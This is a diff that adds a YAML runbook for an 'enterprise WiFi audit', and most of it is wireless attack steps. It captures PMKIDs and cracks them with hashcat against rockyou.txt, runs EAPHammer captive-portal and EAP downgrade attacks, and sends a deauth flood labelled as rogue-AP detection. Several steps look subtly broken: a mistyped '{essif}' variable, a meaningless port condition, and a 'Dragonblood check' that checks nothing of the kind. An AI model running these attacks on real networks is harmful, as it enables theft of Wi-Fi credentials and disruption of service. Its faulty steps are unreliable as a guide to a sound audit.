@@ -1,0 +1,177 @@
+# v2 runbook — Enterprise WiFi auditing: EAPHammer, PMKID, WPA3 Dragonblood, rogue AP
+name: "Enterprise WiFi Audit"
+description: "Enterprise wireless assessment: EAP attacks, PMKID capture, WPA3 Dragonblood, rogue detection"
+version: "2.0"
+
+vars:
+  iface: "wlan0"
+  bssid: ""
+  essid: ""
+  channel: "6"
+  handshake_dir: ""
+
+preflight:
+  - id: check_iface
+    type: log
+    message: "Enterprise WiFi audit on interface {iface} — ensure monitor mode"
+
+steps:
+  # ---- Phase 1: Interface & monitor mode ----
+  - id: iface_check
+    name: "Check wireless interface"
+    tool: iwconfig
+    args: ["{iface}"]
+    timeout: 10
+
+  - id: enable_monitor
+    name: "Enable monitor mode"
+    tool: airmon-ng
+    args: ["start", "{iface}"]
+    timeout: 30
+
+  # ---- Phase 2: AP reconnaissance ----
+  - id: ap_scan
+    name: "Scan access points"
+    tool: airodump-ng
+    args: ["--band", "abg",
+           "--write", "{case_dir}/ap-scan",
+           "--output-format", "csv",
+           "{iface}"]
+    timeout: 30
+
+  # ---- Phase 3: PMKID capture ----
+  - id: pmkid_check
+    name: "PMKID capture attempt"
+    type: conditional
+    condition:
+      any:
+        - on_port:5500
+    then:
+      - id: hcxdumptool
+        name: "PMKID capture via hcxdumptool"
+        tool: hcxdumptool
+        args: ["-o", "{case_dir}/pmkid.pcapng",
+               "-i", "{iface}",
+               "--enable_status=1"]
+        timeout: 60
+        artifacts: ["{case_dir}/pmkid.pcapng"]
+
+      - id: convert_pmkid
+        name: "Convert PMKID to hashcat format"
+        tool: hcxpcaptool
+        args: ["-z", "{case_dir}/pmkid.16800",
+               "{case_dir}/pmkid.pcapng"]
+        timeout: 30
+
+      - id: crack_pmkid
+        name: "Crack PMKID hash"
+        tool: hashcat
+        args: ["-m", "16800",
+               "{case_dir}/pmkid.16800",
+               "/wordlists/rockyou.txt",
+               "--force", "-O"]
+        timeout: 300
+
+  # ---- Phase 4: EAPHammer enterprise attacks ----
+  - id: eap_attack
+    name: "Enterprise EAP attack (EAPHammer)"
+    type: conditional
+    condition:
+      any:
+        - contains: "WPA2-EAP"
+          ref: ap_scan
+        - contains: "WPA3"
+          ref: ap_scan
+    then:
+      - id: eaphammer_pmkid
+        name: "EAPHammer PMKID capture"
+        tool: eaphammer
+        args: ["--bssid", "{bssid}", "--essid", "{essid}",
+               "--interface", "{iface}",
+               "--auth-type", "WPA2-EAP",
+               "--capture-pmkid",
+               "--output-dir", "{case_dir}/eaphammer"]
+        timeout: 300
+
+      - id: eaphammer_captive
+        name: "EAPHammer captive portal"
+        tool: eaphammer
+        args: ["--bssid", "{bssid}", "--essid", "{essid}",
+               "--interface", "{iface}",
+               "--captive-portal",
+               "--output-dir", "{case_dir}/eaphammer-captive"]
+        timeout: 300
+
+      - id: eap_downgrade
+        name: "EAP downgrade attack"
+        tool: eaphammer
+        args: ["--bssid", "{bssid}", "--essid", "{essif}",
+               "--interface", "{iface}",
+               "--auth-type", "WPA-EAP",
+               "--output-dir", "{case_dir}/eaphammer-downgrade"]
+        timeout: 300
+
+  # ---- Phase 5: WPA3 Dragonblood check ----
+  - id: wpa3_check
+    name: "WPA3 Dragonblood attacks"
+    type: conditional
+    condition:
+      contains: "WPA3"
+      ref: ap_scan
+    then:
+      - id: dragonblood
+        name: "Dragonblood vulnerability check"
+        tool: hashcat
+        args: ["--identify", "{case_dir}/pmkid.16800"]
+        timeout: 30
+
+  # ---- Phase 6: Rogue AP detection ----
+  - id: rogue_detect
+    name: "Rogue AP detection"
+    type: parallel
+    steps:
+      - id: beacon_check
+        name: "Beacon interval analysis"
+        tool: tcpdump
+        args: ["-r", "{case_dir}/ap-scan-01.cap",
+               "-n", "subtype beacon",
+               "-o", "{case_dir}/beacons.txt"]
+        timeout: 30
+
+      - id: deauth_flood
+        name: "Deauth flood test"
+        tool: aireplay-ng
+        args: ["--deauth", "10",
+               "-a", "{bssid}",
+               "{iface}"]
+        timeout: 30
+
+  # ---- Phase 7: Prompt for handshake cracking ----
+  - id: ask_crack
+    type: prompt
+    message: "Attempt handshake cracking with a custom wordlist?"
+    then:
+      - id: aircrack_crack
+        name: "Crack handshake"
+        tool: aircrack-ng
+        args: ["-w", "/wordlists/rockyou.txt",
+               "{case_dir}/ap-scan-01.cap"]
+        timeout: 600
+
+  # ---- Phase 8: Report ----
+  - id: report
+    name: "WiFi audit report"
+    type: report
+    format: markdown
+    title: "Enterprise WiFi Audit — {essid} ({bssid})"
+    output: "{case_dir}/wifi-audit-report.md"
+    sections:
+      - heading: "Target AP"
+        body: "- ESSID: {essid}\n- BSSID: {bssid}\n- Channel: {channel}"
+      - heading: "Findings"
+        body: "PMKID captured, EAP test results, rogue AP scan data in case directory."
+
+postflight:
+  - id: cleanup
+    type: log
+    message: "WiFi audit complete — results in {case_dir}"
